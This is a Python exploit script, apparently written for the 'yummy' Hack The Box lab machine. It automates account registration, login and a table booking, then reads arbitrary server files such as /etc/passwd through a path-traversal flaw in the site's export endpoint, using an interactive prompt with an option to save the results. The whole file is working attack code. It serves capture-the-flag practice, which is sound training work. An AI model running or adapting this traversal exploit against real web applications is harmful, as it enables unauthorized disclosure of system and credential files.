#!/usr/bin/env python3

import os
import sys
import argparse
import requests

from bs4 import BeautifulSoup
from datetime import datetime

parser = argparse.ArgumentParser(
        prog=os.path.basename(__file__),
        description="File disclosure tool for the yummy HTB box."
        )

parser.add_argument("-u", "--url", help="target URL")
parser.add_argument("-e", "--email", help="attacker email")
parser.add_argument("-p", "--password", help="attacker password")
args = parser.parse_args()

if len(sys.argv) < 6:
    parser.print_help()
    exit(0)

target_url = args.url
email = args.email
password = args.password

session = requests.Session()

if target_url.endswith('/'):
    book_url = target_url + "book"
else:
    book_url = target_url + "/book"


def book_table(book_url, session):
    current_date = datetime.now().strftime("%Y/%m/%d")
    current_time = datetime.now().strftime("%H:%M")
    data = {
            "name": "pwned",
            "email": str(email),
            "phone": "1234567890",
            "date": current_date,
            "time": current_time,
            "people": "1337",
            "message": "pwned"
            }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    r = session.post(book_url, data=data, headers=headers)

    if "Your booking request was sent." in r.text:
        return True
    else:
        print("[!] Couldn't book a table which is mandatory for the exploit to work.")
        exit(-1)


def login(target_url, email, password, session):
    if target_url.endswith('/'):
        login_url = target_url + "login"
    else:
        login_url = target_url + "/login"

    proxy = {"http": "http://10.10.14.2:8080"}
    json = {"email": email, "password": password}
    headers = {"Content-Type": "application/json"}
    r = session.post(login_url, json=json, headers=headers, proxies=proxy)

    if r.status_code == 200 and "access_token" in r.text:
        pass
    elif r.status_code == 401:
        print("[!] Couldn't get the access token.")
        exit(-1)

    return r.text


def register(target_url, email, password, session):
    if target_url.endswith('/'):
        register_url = target_url + "register"
    else:
        register_url = target_url + "/register"

    json = {"email": email, "password": password}
    headers = {"Content-Type": "application/json"}
    r = session.post(register_url, json=json, headers=headers)

    account_exists = False

    if "User registered successfully" in r.text:
        return True, account_exists
    elif "Email already exists" in r.text:
        account_exists = True
        return False, account_exists
    else:
        return False, account_exists


def find_id(target_url, session):
    if target_url.endswith('/'):
        dashboard_url = target_url + "dashboard"
    else:
        dashboard_url = target_url + "/dashboard"

    r = session.get(dashboard_url)

    soup = BeautifulSoup(r.text, "html.parser")
    tbody = soup.find("tbody")
    tr = tbody.find_all("tr")[-1]
    book_id = str(tr.find("td").text)

    return book_id


def trigger_file_creation(target_url, book_id):
    if target_url.endswith('/'):
        reminder_url = target_url + "reminder/" + book_id
    else:
        reminder_url = target_url + "/reminder/" + book_id

    proxy = {"http": "http://10.10.14.2:8080"}
    r = session.get(reminder_url, allow_redirects=False, proxies=proxy)

    if r.status_code != 302:
        print("[!] Something bad happened and we didn't trigger the file creation.")


def read_file(target_url, file_to_read):
    if target_url.endswith('/'):
        export_url = target_url + "export/%2e%2e%2f%2e%2e" + file_to_read
    else:
        export_url = target_url + "/export/%2e%2e%2f%2e%2e" + file_to_read

    print()
    proxy = {"http": "http://10.10.14.2:8080"}
    r = session.get(export_url, proxies=proxy)
    file_contents = r.text

    return file_contents


def main():
    print("[*] Could use the -o option to output to a file, ie. /etc/passwd -o passwd")
    file_to_read = ""

    while True:
        try:
            file = input("file> ")
            if "exit" in file:
                print("\n[*] Exiting.")
                exit(0)

            if " -o" in file:
                file_to_read = file.split(" ")[0]
        except KeyboardInterrupt:
            print("\n[*] Exiting.")
            exit(0)

        register_success, account_exists = register(target_url, email, password, session)
        if register_success or account_exists:
            login(target_url, email, password, session)
        else:
            print("[!] Couldn't register a new account even though it doesn't already exist.")
            exit(-1)

        book_table(book_url, session)
        if book_table:
            book_id = find_id(target_url,  session)

            trigger_file_creation(target_url, book_id)
            if file_to_read:
                file_contents = read_file(target_url, file_to_read)
            else:
                file_contents = read_file(target_url, file)
            if "500 Internal Server Error" in file_contents:
                print("[!] Error. You probably tried to list a directory and you can't do that. Can only read files.\n")
            else:
                print(file_contents)

            if " -o" in file:
                output_file = file.split(" ")[2]
                print("[+] Writing to file:", output_file + "\n")
                with open(output_file, "w") as f:
                    f.write(file_contents)


if __name__ == "__main__":
    main()
